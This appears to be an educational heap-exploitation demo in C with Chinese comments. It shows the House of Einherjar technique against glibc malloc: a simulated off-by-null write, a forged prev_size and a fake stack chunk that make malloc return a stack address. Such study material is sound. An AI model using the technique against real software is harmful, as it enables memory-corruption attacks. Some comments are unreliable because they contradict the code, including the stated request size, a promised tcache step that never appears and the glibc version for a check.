/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_einherjar
 * 文件标注范围：2.26 ~ 2.29
 * 模拟漏洞：用一次 off-by-null/off-by-one 清掉 PREV_INUSE，同时能伪造 prev_size 和前块的双向链。
 * 核心流程：让 free 误以为前面存在一个 fake free chunk，借后向合并拼出一个覆盖到活动 chunk 的大块，
 *          再靠 tcache poisoning 定位到最终目标。
 * 成功判据：重新分配后拿到重叠区域或目标地址。2.29 起要求 prev_size 与前块 size 相等，2.32 起 poisoning 需要安全链接编码。
 *
 * 阅读约定：malloc 返回的是用户数据区；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。文件里出现的 UAF、越界和 double free 都是故意模拟的漏洞行为，不是正常的 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时要按实际 libc 源码重新判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

/*
 * 感谢 st4g3r 公开的 House of Einherjar。这个手法用 off-by-one null 覆盖下一块
 * size 的 PREV_INUSE 位，再伪造 prev_size 指向前方一个 free chunk，让 free 误以为
 * 应该向后合并到攻击者选定的地址。相比普通的 Poison Null Byte，它能直接构造出
 * 更强的重叠区域或任意起点分配，但代价是额外需要一次堆地址泄漏来算出 fake prev_size。
 */

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	a = (uint8_t*) malloc(0x38);

	int real_a_size = malloc_usable_size(a);

	// 在已知地址上构造 fake free chunk；这个低版本示例把它放在栈上，方便直接观察返回地址。

	size_t fake_chunk[6];

	fake_chunk[0] = 0x100; // 2.26 起要求这个 prev_size 与 fake_chunk->size 一致，才能通过新增的检查。
	fake_chunk[1] = 0x100; // 先给一个一致的小尺寸占位；实际利用前会覆盖成两地址间的真实距离。
	fake_chunk[2] = (size_t) fake_chunk; // fd 指向自己，满足 unlink 里 FD->bk == P 的检查。
	fake_chunk[3] = (size_t) fake_chunk; // bk 指向自己，满足 unlink 里 BK->fd == P 的检查。
	fake_chunk[4] = (size_t) fake_chunk; // fd_nextsize 自环，避免大 chunk 的附加链检查访问到未知地址。
	fake_chunk[5] = (size_t) fake_chunk; // bk_nextsize 同样自环，让 fake chunk 的结构完整、可以正常解引用。

	/*
	 * 选择请求 0xf8，让对齐后的物理 size 为 0x100，带 PREV_INUSE 时为 0x101。
	 * 最低有效尺寸字节本来就是 0x00，off-by-null 只会清掉标志位，不会意外
	 * 把 chunk 缩小；如果低字节还含有尺寸信息，就必须在缩小后的边界另行伪造 next chunk。
	 */
	b = (uint8_t*) malloc(0x4f8);
	/* 这次漏洞模拟的效果是覆盖下一块 size 的最低字节，重点是清掉 PREV_INUSE。 */

	/* 漏洞模拟开始/结束 */
	a[real_a_size] = 0;
	/* 漏洞模拟开始/结束 */

	// 用 a 末尾这个可控机器字伪造 b->prev_size，让 b 向后跳到 fake_chunk。

	size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);

	*(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;

	// fake_chunk->size 要和 b->prev_size 相等，才能满足 size(P)==prev_size(next_chunk(P)) 这条检查。
	fake_chunk[1] = fake_size;

	// 释放 b：PREV_INUSE 已经被清零，_int_free 会把它和前方的 fake_chunk 向后合并。
	free(b);

	// 如果 b 后面还有已分配的 chunk，fake_chunk + fake_size 就必须落在攻击者
	// 可写的位置，并且要在那里伪造 next_chunk->prev_size == fake_size，才能通过
	// size(P) == prev_size(next_chunk(P)) 的检查。本例让合并结果正好邻接 wilderness，
	// 所以不需要额外伪造尾部边界。

	d = malloc(0x200);

	assert((long)d == (long)&fake_chunk[2]);
}
